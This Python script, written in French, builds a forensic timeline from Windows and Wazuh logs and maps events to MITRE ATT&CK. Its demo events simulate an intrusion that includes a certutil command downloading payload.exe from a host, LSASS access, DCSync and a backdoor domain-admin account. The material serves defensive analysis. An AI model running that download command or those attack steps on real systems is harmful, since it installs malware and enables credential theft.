#!/usr/bin/env python3
"""
log_timeline.py — Construit une timeline chronologique depuis plusieurs sources de logs
Auteur  : Joe Bichall (@joebat10)
Usage   : python log_timeline.py --evtx Security.evtx --output timeline.csv
          python log_timeline.py --demo

Sources supportées :
  - Logs Windows Event (.evtx) via python-evtx ou wevtutil
  - Logs Wazuh (JSON)
  - Logs Sysmon
  - Fichiers texte horodatés
"""

import re
import csv
import json
import argparse
import subprocess
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import List

try:
    from rich.console import Console
    RICH = True
    console = Console()
except ImportError:
    RICH = False


# ─── MODÈLE DE DONNÉES ───────────────────────────────────────────────────────

@dataclass
class TimelineEvent:
    timestamp: str
    source: str        # Origine : EVTX, Sysmon, Wazuh, etc.
    event_id: str
    category: str      # Login, Process, Network, Registry, File, etc.
    description: str
    user: str = ""
    host: str = ""
    detail: str = ""
    mitre_tactic: str = ""
    mitre_technique: str = ""
    severity: str = "info"    # info / low / medium / high / critical


# Mapping EventID Windows → catégorie + description + MITRE
WINDOWS_EVENTS = {
    # Authentification
    "4624": ("Login",    "Connexion réussie",                    "T1078",    "Initial Access"),
    "4625": ("Login",    "Echec de connexion",                   "T1110",    "Credential Access"),
    "4634": ("Login",    "Déconnexion",                          "",         ""),
    "4648": ("Login",    "Connexion avec credentials explicites","T1078",    "Initial Access"),
    "4672": ("Login",    "Privilèges spéciaux assignés",         "T1134",    "Privilege Escalation"),
    "4720": ("Account",  "Compte utilisateur créé",              "T1136",    "Persistence"),
    "4722": ("Account",  "Compte utilisateur activé",            "",         ""),
    "4724": ("Account",  "Réinitialisation mot de passe",        "T1098",    "Persistence"),
    "4728": ("Account",  "Membre ajouté à groupe sécurité",      "T1098",    "Persistence"),
    "4732": ("Account",  "Membre ajouté groupe local",           "T1098",    "Persistence"),
    "4756": ("Account",  "Membre ajouté groupe universel",       "T1098",    "Persistence"),
    # Processus
    "4688": ("Process",  "Processus créé",                       "T1059",    "Execution"),
    "4689": ("Process",  "Processus terminé",                    "",         ""),
    # Partage réseau
    "5140": ("Network",  "Partage réseau accédé",                "T1021.002","Lateral Movement"),
    "5145": ("Network",  "Fichier réseau vérifié",               "T1021.002","Lateral Movement"),
    # Services
    "7045": ("Service",  "Nouveau service installé",             "T1543.003","Persistence"),
    "7036": ("Service",  "Service démarré/arrêté",               "",         ""),
    # Kerberos
    "4768": ("Kerberos", "Ticket TGT demandé (AS-REQ)",          "T1558",    "Credential Access"),
    "4769": ("Kerberos", "Ticket TGS demandé",                   "T1558.003","Credential Access"),
    "4771": ("Kerberos", "Echec pré-auth Kerberos",              "T1110",    "Credential Access"),
    # LSASS / Credentials
    "4776": ("Credentials","Validation credentials NTLM",        "T1550.002","Lateral Movement"),
    # Audit policy
    "4719": ("Policy",   "Stratégie d'audit modifiée",           "T1562",    "Defense Evasion"),
    "4735": ("Policy",   "Groupe de sécurité local modifié",     "T1098",    "Persistence"),
    # Sysmon
    "1":    ("Process",  "Sysmon: Processus créé",               "T1059",    "Execution"),
    "3":    ("Network",  "Sysmon: Connexion réseau",             "T1071",    "Command and Control"),
    "7":    ("Load",     "Sysmon: Image (DLL) chargée",          "T1574",    "Defense Evasion"),
    "8":    ("Injection","Sysmon: CreateRemoteThread",           "T1055",    "Defense Evasion"),
    "10":   ("Credentials","Sysmon: ProcessAccess (LSASS?)",     "T1003",    "Credential Access"),
    "11":   ("File",     "Sysmon: Fichier créé",                 "T1105",    "Command and Control"),
    "12":   ("Registry", "Sysmon: Clé registry créée/supprimée","T1547",    "Persistence"),
    "13":   ("Registry", "Sysmon: Valeur registry modifiée",    "T1547",    "Persistence"),
    "22":   ("DNS",      "Sysmon: Requête DNS",                  "T1071.004","Command and Control"),
}

SEVERITY_MAP = {
    "4625": "medium", "4648": "medium", "4672": "high",
    "4720": "high",   "4728": "high",   "4769": "high",
    "4776": "medium", "5140": "medium", "7045": "high",
    "8":    "critical","10":  "critical","4719": "high",
}


# ─── PARSERS ─────────────────────────────────────────────────────────────────

class EventLogParser:
    """Parse les fichiers EVTX Windows via wevtutil (disponible sur Windows)."""

    def parse_evtx(self, evtx_path: str) -> List[TimelineEvent]:
        """Parse un fichier .evtx et retourne les événements."""
        events = []
        path = Path(evtx_path)
        if not path.exists():
            print(f"[!] Fichier non trouvé : {evtx_path}")
            return events

        try:
            # wevtutil est disponible nativement sur Windows
            cmd = [
                "wevtutil", "qe", str(path),
                "/f:text", "/rd:true", "/c:1000"
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                events = self._parse_wevtutil_text(result.stdout, path.name)
            else:
                print(f"[!] wevtutil error: {result.stderr}")
        except FileNotFoundError:
            print("[!] wevtutil non disponible (exécuter sur Windows)")
        except Exception as e:
            print(f"[!] Erreur parsing EVTX : {e}")

        return events

    def _parse_wevtutil_text(self, text: str, source: str) -> List[TimelineEvent]:
        events = []
        # Parser le format texte de wevtutil
        event_blocks = text.split("Event[")
        for block in event_blocks[1:]:
            try:
                # Extraire timestamp
                ts_match = re.search(r"Date:\s+(.+?)(?:\n|$)", block)
                id_match = re.search(r"EventID:\s+(\d+)", block)
                user_match = re.search(r"User:\s+(.+?)(?:\n|$)", block)
                desc_match = re.search(r"Description:\s+(.+?)(?:\n|$)", block, re.DOTALL)

                if not (ts_match and id_match):
                    continue

                event_id = id_match.group(1)
                cat, desc, mitre_t, mitre_tac = WINDOWS_EVENTS.get(
                    event_id, ("Other", f"EventID {event_id}", "", "")
                )

                events.append(TimelineEvent(
                    timestamp=ts_match.group(1).strip(),
                    source=source,
                    event_id=event_id,
                    category=cat,
                    description=desc,
                    user=user_match.group(1).strip() if user_match else "",
                    detail=desc_match.group(1).strip()[:150] if desc_match else "",
                    mitre_technique=mitre_t,
                    mitre_tactic=mitre_tac,
                    severity=SEVERITY_MAP.get(event_id, "info"),
                ))
            except Exception:
                continue
        return events


class WazuhLogParser:
    """Parse les fichiers d'alertes Wazuh (JSON)."""

    def parse_alerts_json(self, json_path: str) -> List[TimelineEvent]:
        events = []
        path = Path(json_path)
        if not path.exists():
            return events

        with open(path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    alert = json.loads(line)
                    rule = alert.get("rule", {})
                    agent = alert.get("agent", {})
                    mitre = rule.get("mitre", {})

                    events.append(TimelineEvent(
                        timestamp=alert.get("timestamp", ""),
                        source="Wazuh",
                        event_id=str(rule.get("id", "")),
                        category=rule.get("groups", ["Other"])[0] if rule.get("groups") else "Other",
                        description=rule.get("description", ""),
                        user=alert.get("data", {}).get("win", {}).get("eventdata", {}).get("subjectUserName", ""),
                        host=agent.get("name", ""),
                        mitre_technique=mitre.get("id", [""])[0] if mitre.get("id") else "",
                        mitre_tactic=mitre.get("tactic", [""])[0] if mitre.get("tactic") else "",
                        severity="critical" if rule.get("level", 0) >= 12
                                 else "high" if rule.get("level", 0) >= 8
                                 else "medium" if rule.get("level", 0) >= 4
                                 else "info",
                    ))
                except json.JSONDecodeError:
                    continue
        return events


# ─── TIMELINE BUILDER ────────────────────────────────────────────────────────

class TimelineBuilder:

    def __init__(self):
        self.events: List[TimelineEvent] = []

    def add_events(self, events: List[TimelineEvent]):
        self.events.extend(events)

    def sort_chronological(self):
        """Trie les événements par timestamp."""
        def parse_ts(ts: str) -> datetime:
            formats = [
                "%Y-%m-%dT%H:%M:%S.%fZ",
                "%Y-%m-%dT%H:%M:%SZ",
                "%Y-%m-%dT%H:%M:%S",
                "%m/%d/%Y %H:%M:%S",
                "%d/%m/%Y %H:%M:%S",
            ]
            for fmt in formats:
                try:
                    return datetime.strptime(ts[:26], fmt)
                except ValueError:
                    continue
            return datetime.min

        self.events.sort(key=lambda e: parse_ts(e.timestamp))

    def filter_by_severity(self, min_severity: str) -> List[TimelineEvent]:
        order = ["info", "low", "medium", "high", "critical"]
        min_idx = order.index(min_severity) if min_severity in order else 0
        return [e for e in self.events if order.index(e.severity) >= min_idx]

    def export_csv(self, output_path: str, min_severity: str = "info"):
        events = self.filter_by_severity(min_severity)
        fieldnames = ["timestamp", "source", "event_id", "category", "severity",
                      "description", "user", "host", "mitre_tactic", "mitre_technique", "detail"]
        with open(output_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for e in events:
                row = asdict(e)
                writer.writerow({k: row.get(k, "") for k in fieldnames})
        print(f"[✓] Timeline CSV exportée → {output_path} ({len(events)} événements)")

    def export_json(self, output_path: str):
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump([asdict(e) for e in self.events], f, indent=2, ensure_ascii=False)
        print(f"[✓] Timeline JSON exportée → {output_path}")

    def export_html(self, output_path: str):
        """Génère une timeline HTML interactive."""
        rows = ""
        severity_colors = {
            "critical": "#dc3545", "high": "#fd7e14",
            "medium": "#ffc107",   "low": "#6c757d", "info": "#0dcaf0"
        }
        for e in self.events:
            color = severity_colors.get(e.severity, "#adb5bd")
            mitre_link = ""
            if e.mitre_technique:
                tid = e.mitre_technique.replace(".", "/")
                mitre_link = f'<a href="https://attack.mitre.org/techniques/{tid}" target="_blank">{e.mitre_technique}</a>'
            rows += f"""
            <tr>
              <td style="font-size:0.8em;white-space:nowrap">{e.timestamp[:19]}</td>
              <td><span style="background:{color};color:#fff;padding:2px 6px;border-radius:3px;font-size:0.75em">{e.severity.upper()}</span></td>
              <td>{e.source}</td>
              <td><code>{e.event_id}</code></td>
              <td>{e.category}</td>
              <td>{e.description}</td>
              <td>{e.user}</td>
              <td>{mitre_link}</td>
            </tr>"""

        html = f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>Timeline DFIR — Cyber Homelab</title>
<style>
  body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;margin:0}}
  h1{{padding:20px;background:#161b22;border-bottom:1px solid #30363d;font-size:1.3em}}
  .info{{padding:0 20px 10px;color:#8b949e;font-size:0.85em}}
  table{{width:100%;border-collapse:collapse;font-size:0.85em}}
  th{{background:#161b22;padding:10px;text-align:left;color:#8b949e;position:sticky;top:0}}
  td{{padding:8px 10px;border-bottom:1px solid #21262d}}
  tr:hover{{background:#161b22}}
  code{{background:#21262d;padding:2px 5px;border-radius:3px;color:#79c0ff}}
  a{{color:#58a6ff}}
</style></head><body>
<h1>🔬 Timeline DFIR — Cyber Homelab</h1>
<p class="info">Généré le {datetime.now().strftime('%d/%m/%Y %H:%M')} · {len(self.events)} événements · joebat10/cyber-homelab</p>
<table>
<tr><th>Timestamp</th><th>Sévérité</th><th>Source</th><th>EventID</th>
<th>Catégorie</th><th>Description</th><th>Utilisateur</th><th>MITRE</th></tr>
{rows}
</table></body></html>"""

        Path(output_path).write_text(html, encoding="utf-8")
        print(f"[✓] Timeline HTML exportée → {output_path}")

    def print_summary(self):
        total = len(self.events)
        cats = {}
        sevs = {"critical": 0, "high": 0, "medium": 0, "info": 0}
        for e in self.events:
            cats[e.category] = cats.get(e.category, 0) + 1
            if e.severity in sevs:
                sevs[e.severity] += 1

        print(f"\n{'='*55}")
        print(f"  TIMELINE — {total} événements")
        print(f"{'='*55}")
        print(f"  🔴 Critiques : {sevs['critical']}")
        print(f"  🟠 Hauts     : {sevs['high']}")
        print(f"  🟡 Moyens    : {sevs['medium']}")
        print(f"  ℹ️  Info      : {sevs['info']}")
        print("\n  Catégories :")
        for cat, count in sorted(cats.items(), key=lambda x: -x[1])[:8]:
            print(f"    {cat:<15} {count}")


# ─── MODE DÉMONSTRATION ───────────────────────────────────────────────────────

def generate_demo_events() -> List[TimelineEvent]:
    """Génère une timeline de démonstration réaliste."""
    events = [
        TimelineEvent("2024-03-15T08:02:11", "Security.evtx", "4624", "Login",
                      "Connexion réseau NTLM depuis 192.168.1.50",
                      "CORP\\john.doe", "WS-COMPTA-01", "", "T1078", "Initial Access", "medium"),
        TimelineEvent("2024-03-15T08:05:33", "Sysmon", "1", "Process",
                      "Sysmon: cmd.exe lancé par explorer.exe",
                      "CORP\\john.doe", "WS-COMPTA-01", "cmd.exe /c whoami", "T1059", "Execution", "info"),
        TimelineEvent("2024-03-15T08:06:01", "Sysmon", "1", "Process",
                      "Sysmon: net.exe — énumération utilisateurs",
                      "CORP\\john.doe", "WS-COMPTA-01", "net user /domain", "T1087", "Discovery", "medium"),
        TimelineEvent("2024-03-15T08:07:45", "Sysmon", "1", "Process",
                      "Sysmon: certutil télécharge un fichier",
                      "CORP\\john.doe", "WS-COMPTA-01",
                      "certutil -urlcache -f http://192.168.1.200/payload.exe", "T1105", "C2", "high"),
        TimelineEvent("2024-03-15T08:10:22", "Security.evtx", "4769", "Kerberos",
                      "Ticket TGS RC4 pour MSSQLSvc/db.corp.local",
                      "CORP\\john.doe", "DC-PROD-01", "EncryptionType=0x17 (RC4)", "T1558.003", "Credential Access", "high"),
        TimelineEvent("2024-03-15T08:11:00", "Security.evtx", "4769", "Kerberos",
                      "Ticket TGS RC4 pour HTTP/intranet.corp.local",
                      "CORP\\john.doe", "DC-PROD-01", "EncryptionType=0x17 (RC4)", "T1558.003", "Credential Access", "high"),
        TimelineEvent("2024-03-15T08:14:55", "Sysmon", "10", "Credentials",
                      "Sysmon: Accès à lsass.exe (GrantedAccess: 0x1010)",
                      "CORP\\john.doe", "WS-COMPTA-01", "Source: cmd.exe → Target: lsass.exe", "T1003.001", "Credential Access", "critical"),
        TimelineEvent("2024-03-15T08:18:30", "Security.evtx", "4624", "Login",
                      "Connexion réseau Type 3 vers DC-PROD-01",
                      "CORP\\administrator", "DC-PROD-01", "AuthPackage: NTLM", "T1550.002", "Lateral Movement", "critical"),
        TimelineEvent("2024-03-15T08:20:05", "Security.evtx", "4662", "Kerberos",
                      "Opération de réplication DS — DCSync possible",
                      "CORP\\administrator", "DC-PROD-01", "Properties: 1131f6aa-9c07-11d1", "T1003.006", "Credential Access", "critical"),
        TimelineEvent("2024-03-15T08:22:17", "Security.evtx", "7045", "Service",
                      "Nouveau service installé : PSEXESVC",
                      "CORP\\administrator", "WS-FINANCE-01",
                      "ImagePath: C:\\Windows\\PSEXESVC.exe", "T1569.002", "Lateral Movement", "critical"),
        TimelineEvent("2024-03-15T08:25:00", "Security.evtx", "4720", "Account",
                      "Nouveau compte créé : backdoor_svc",
                      "CORP\\administrator", "DC-PROD-01", "", "T1136.002", "Persistence", "high"),
        TimelineEvent("2024-03-15T08:26:30", "Security.evtx", "4728", "Account",
                      "Compte ajouté au groupe Domain Admins",
                      "CORP\\administrator", "DC-PROD-01", "Member: backdoor_svc", "T1098", "Persistence", "critical"),
    ]
    return events


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Construit une timeline DFIR depuis des logs Windows/Wazuh",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples :
  python log_timeline.py --demo --format html
  python log_timeline.py --evtx Security.evtx --format csv
  python log_timeline.py --wazuh alerts.json --min-severity high
  python log_timeline.py --evtx Security.evtx --evtx Sysmon.evtx --format all
"""
    )
    parser.add_argument("--evtx",         action="append", default=[], help="Fichier(s) EVTX à parser")
    parser.add_argument("--wazuh",        help="Fichier alerts.json Wazuh")
    parser.add_argument("--demo",         action="store_true", help="Données de démonstration")
    parser.add_argument("--format",       choices=["csv", "json", "html", "all"], default="csv")
    parser.add_argument("--output",       default="timeline", help="Préfixe des fichiers de sortie")
    parser.add_argument("--min-severity", choices=["info","low","medium","high","critical"],
                        default="info", help="Sévérité minimale à inclure")
    args = parser.parse_args()

    builder = TimelineBuilder()
    evtx_parser  = EventLogParser()
    wazuh_parser = WazuhLogParser()

    if args.demo:
        print("[i] Mode démonstration activé")
        builder.add_events(generate_demo_events())
    else:
        for evtx_file in args.evtx:
            print(f"[*] Parsing EVTX : {evtx_file}")
            builder.add_events(evtx_parser.parse_evtx(evtx_file))
        if args.wazuh:
            print(f"[*] Parsing Wazuh JSON : {args.wazuh}")
            builder.add_events(wazuh_parser.parse_alerts_json(args.wazuh))

    if not builder.events:
        print("[!] Aucun événement. Utilisez --demo ou --evtx/--wazuh")
        return

    builder.sort_chronological()
    builder.print_summary()

    if args.format in ("csv", "all"):
        builder.export_csv(f"{args.output}.csv", args.min_severity)
    if args.format in ("json", "all"):
        builder.export_json(f"{args.output}.json")
    if args.format in ("html", "all"):
        builder.export_html(f"{args.output}.html")


if __name__ == "__main__":
    main()
